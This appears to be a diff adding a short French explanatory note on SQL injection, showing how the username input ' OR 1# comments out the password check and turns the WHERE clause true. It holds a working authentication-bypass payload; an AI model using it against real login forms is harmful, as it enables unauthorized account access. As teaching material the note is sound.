@@ -1,0 +1,21 @@
+Requête dans le back-end :
+
+    SELECT * FROM users WHERE username = '' AND password = '';
+
+En injectant ceci dans le nom d'utilisateur
+
+    ' OR 1#
+
+On obtient :
+
+    SELECT * FROM users WHERE username = '' OR 1#' AND password = '';
+
+Avec :
+
+    username = '' --> false
+    1 --> true
+
+On a :
+
+    WHERE false OR true --> true
+
